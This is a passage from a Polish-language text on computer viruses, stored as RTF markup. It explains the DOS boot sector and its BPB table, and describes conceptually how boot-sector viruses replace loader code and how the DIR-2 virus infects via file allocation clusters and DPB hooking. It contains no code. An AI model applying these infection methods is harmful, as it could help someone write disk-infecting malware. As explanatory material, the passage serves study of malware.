oryginalnego sektora tablicy partycji (tak\uc1\u380\'bfe pod adres 0000:7COO) oddaje do niej sterowanie, a tam oryginalny program \uc1\u322\'b3aduj\uc1\u261\'b9cy kontynuuje normalne wczytywanie systemu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.3. Rekord \uc1\u322\'b3aduj\uc1\u261\'b9cy (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}BOOT-sector}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Program \uc1\u322\'b3aduj\uc1\u261\'b9cy, zawarty w MBR, wczytuje system ze strefy aktywnej, dok\uc1\u322\'b3adniej: wczytuje pierwszy sektor (tzw. BOOT-sektor) ze strefy aktywnej pod adres 0000:7COO (a wi\uc1\u281\'eac pod ten sam co w przypadku MBR), oddaje do niego sterowanie i dopiero program zawarty w BOOT-sektorze \uc1\u322\'b3aduje }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}lik zawieraj\uc1\u261\'b9cy j\uc1\u261\'b9dro systemu (w przypadku systemu DOS - najcz\uc1\u281\'ea\uc1\u347\'9cciej IO.SYS).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfsza operacja jest wykonywana tylko dla dysku twardego. W przypadku dyskietek BIOS bezpo\uc1\u347\'9crednio \uc1\u322\'b3aduje BOOT-sektor z dyskietki i oddaje do niego sterowanie. Jak wida\uc1\u263\'e6, BIOS nie rozr\'f3\uc1\u380\'bfnia, czy wczytywany sektor jest MBR czy BOOT-sektorem, a jedynie odczytuje pierwszy sektor z dysku lub dyskietki i oddaje do niego sterowanie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przy pierwszym dost\uc1\u281\'eapie do dysku system kopiuje do swych struktur wewn\uc1\u281\'eatrznych cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 informacji zawartych w BOOT-sektorze. Informacje te s\uc1\u261\'b9 zawarte w tzw. bloku BPB, zawartym w BOOT-sektorze od adresu 0Bh do 23h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zawarto\uc1\u347\'9c\uc1\u263\'e6 BOOT-sektora przedstawiono w poni\uc1\u380\'bfszej tabeli. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Zawarto\uc1\u347\'9c\uc1\u263\'e6 BOOT-sektora}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.8001in/4.7883in/; table-sdh:89647a8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-02}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Instrukcja skoku do programu \uc1\u322\'b3aduj\uc1\u261\'b9cego system, najcz\uc1\u281\'ea\uc1\u347\'9cciej (OEBh ?? 90h). czyli JMP SHORT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}03-0A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nazwa wersji systemu (jako \uc1\u322\'b3a\uc1\u324\'f1cuch ASCII)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pocz\uc1\u261\'b9tek bloku  BPB}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0} +}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0B-0C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wielko\uc1\u347\'9c\uc1\u263\'e6 sektora w bajtach }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0E-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Liczba sektor\'f3w zarezerwowanych na pocz\uc1\u261\'b9tku dysku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba kopii FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11-12}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Maksymalna liczba plik\'f3w w katalogu g\uc1\u322\'b3\'f3wnym }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}13-14}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Ca\uc1\u322\'b3kowita liczba sektor\'f3w na dysku logicznym (nie u\uc1\u380\'bfywane)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Bajt identyfikacji no\uc1\u347\'9cnika }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Liczba sektor\'f3w zaj\uc1\u281\'eatych przez FAT }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-19}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Liczba sektor\'f3w na \uc1\u347\'9ccie\uc1\u380\'bfce }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1A-1B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0} Liczba g\uc1\u322\'b3owic dysku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1C-1D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Koniec bloku BPB }\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}24}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer fizyczny dysku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}25}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Zarezerwowane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}26}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rozszerzony znacznik BOOT-sektora }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}27-2A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer woluminu }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2B-35}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Etykieta dysku                                 }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}36-3D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Typ FAT zapisany jako \uc1\u322\'b3a\uc1\u324\'f1cuch ASCII            }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2536\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}??-1FF}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Program wcz}{\f0\fs24\lang1045{\*\listtag0}ytuj\uc1\u261\'b9cy system }\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nietrudno domy\uc1\u347\'9cli\uc1\u263\'e6 si\uc1\u281\'ea, i\uc1\u380\'bf infekcja BOOT-sektora polega\uc1\u263\'e6 b\uc1\u281\'eadzie na zamianie oryginalnego programu w nim zawartego na kod wirusa, tak jak mia\uc1\u322\'b3o to miejsce w przypadku sektora tablicy partycji. Zamiast przerwania 13h przy infekcji BOOT-sektora \uc1\u322\'b3atwiej u\uc1\u380\'bfy\uc1\u263\'e6 przerwa\uc1\u324\'f1 25h i 26h, gdy\uc1\u380\'bf bior\uc1\u261\'b9 one na siebie ci\uc1\u281\'ea\uc1\u380\'bfar wszystkich oblicze\uc1\u324\'f1 zwi\uc1\u261\'b9zanych z translacj\uc1\u261\'b9 sektor\'f3w logicznych na fizyczne.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.4. Jednostki Alokacji Plik\'f3w (JAP) (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}clusters}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pierwszym wirusem, kt\'f3ry zara\uc1\u380\'bfa\uc1\u322\'b3 JAP, by\uc1\u322\'b3 wirus DIR-2. Ze wzgl\uc1\u281\'eadu na pewne ograniczenia zara\uc1\u380\'bfa\uc1\u322\'b3 tylko w wersjach DOS mniejszych od 5.0. Aby zrozumie\uc1\u263\'e6 zasad\uc1\u281\'ea jego dzia\uc1\u322\'b3ania, trzeba przede wszystkim wiedzie\uc1\u263\'e6, w jaki spos\'f3b system DOS zapisuje pliki na dysku. Ka\uc1\u380\'bfdy dysk logiczny widoczny w systemie posiada tzw. tablic\uc1\u281\'ea FAT (ang. File Alocation Tobie), kt\'f3ra dzieli dysk na r\'f3wne cz\uc1\u281\'ea\uc1\u347\'9cci, zwane Jednostkami Alokacji Plik\'f3w JAP). Wielko\uc1\u347\'9c\uc1\u263\'e6 JAP jest r\'f3\uc1\u380\'bfna dla r\'f3\uc1\u380\'bfnych pojemno\uc1\u347\'9c}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}i dysk\'f3w. Informacja o ilo\uc1\u347\'9cci sektor\'f3w zajmowanych przez jedn\uc1\u261\'b9 JAP zawarta jest w BOOT-sektorze, w polu 0Dh. Ka\uc1\u380\'bfdy plik zapisywany na dysku ma do dyspozycji odpowiedni\uc1\u261\'b9, wynikaj\uc1\u261\'b9c\uc1\u261\'b9 z jego d\uc1\u322\'b3ugo\uc1\u347\'9cci, liczb\uc1\u281\'ea jednostek alokacji. Liczba ta r\'f3wna jest d\uc1\u322\'b3ugo\uc1\u347\'9cci }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}liku podzielonej przez rozmiar jednej JAP. Obliczon\uc1\u261\'b9 liczb\uc1\u281\'ea nale\uc1\u380\'bfy zaokr\uc1\u261\'b9gli\uc1\u263\'e6 w g\'f3r\uc1\u281\'ea (aby uwzgl\uc1\u281\'eadni\uc1\u263\'e6 ko\uc1\u324\'f1c\'f3wk\uc1\u281\'ea pliku, kt\'f3ra nie mie\uc1\u347\'9cci si\uc1\u281\'ea w pe\uc1\u322\'b3nej JAP). Jak wida\uc1\u263\'e6, pliki zapisane na dysku wcale nie musz\uc1\u261\'b9 by\uc1\u263\'e6 zapisane sekwencyjnie, tzn. r\'f3\uc1\u380\'bfne fragmenty pli}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}u mog\uc1\u261\'b9 by\uc1\u263\'e6 porozrzucane po ca\uc1\u322\'b3ym dysku. Tak\uc1\u380\'bfe widziana przez u\uc1\u380\'bfytkownika d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku tylko czasami zgadza si\uc1\u281\'ea z prawdziw\uc1\u261\'b9 d\uc1\u322\'b3ugo\uc1\u347\'9cci\uc1\u261\'b9 zajmowan\uc1\u261\'b9 przez plik na dysku (gdy d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku jest wielokrotno\uc1\u347\'9cci\uc1\u261\'b9 d\uc1\u322\'b3ugo\uc1\u347\'9cci JAP). Wczytuj\uc1\u261\'b9c plik DOS odczytuje z odpow}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}edniego pola katalogu numer pierwszej JAP i na jej podstawie, w miar\uc1\u281\'ea kolejnych odczyt\'f3w/zapis\'f3w do pliku, porusza si\uc1\u281\'ea po \uc1\u322\'b3a\uc1\u324\'f1cuchu JAP, korzystaj\uc1\u261\'b9c z danych zawartych w tablicy FAT.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirus infekuj\uc1\u261\'b9cy przy u\uc1\u380\'bfyciu JAP zmienia w polu katalogu rozmiar danego pliku (najcz\uc1\u281\'ea\uc1\u347\'9cciej na rozmiar jednej JAP) oraz warto\uc1\u347\'9c\uc1\u263\'e6 pierwszej JAP pliku, kt\'f3ra wskazuj\uc1\u261\'b9c na wirusa umo\uc1\u380\'bfliwia jego wczytanie niejako przed kod programu \uc1\u322\'b3adowanego z dysku i w efekcie przej\uc1\u281\'eacie kontroli nad systemem. Zainstalowany w pami\uc1\u281\'eaci wirus ma nast\uc1\u281\'eap}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ie mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 wczytania dalszej cz\uc1\u281\'ea\uc1\u347\'9cci programu na podsta}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch wie przechowywanej oryginalnej warto\uc1\u347\'9cci pierwszej JAP oraz d\uc1\u322\'b3ugo\uc1\u347\'9cci pliku. W celu zapewnienia poprawnego wczytania reszty pliku wirus musi dotrze\uc1\u263\'e6 do wewn\uc1\u281\'eatrznych procedur systemu operacyjnego, przeznaczonych do obs\uc1\u322\'b3ugi dysk\'f3w. Najcz\uc1\u281\'ea\uc1\u347\'9cciej realizuje si\uc1\u281\'ea to poprzez odpowiedni\uc1\u261\'b9 zamian\uc1\u281\'ea adresu procedury obs\uc1\u322\'b3uguj\uc1\u261\'b9cej dysk, zawartej w tzw. blokach DPB (ang. Drive Parameter Block), strukturach tworzonych przez system operacyjny podczas jego inicjacji dla w}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}zystkich istniej\uc1\u261\'b9cych w systemie dysk\'f3w logicznych. Struktura DPB zawiera wszystkie informacje potrzebne do obs\uc1\u322\'b3ugi dysku logicznego przez system (cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 danych znajduje si\uc1\u281\'ea w bloku BPB dysku, zawartego w BOOT-sektorze).}{\f0\fs24\lang1045{\*\listtag0}\par}
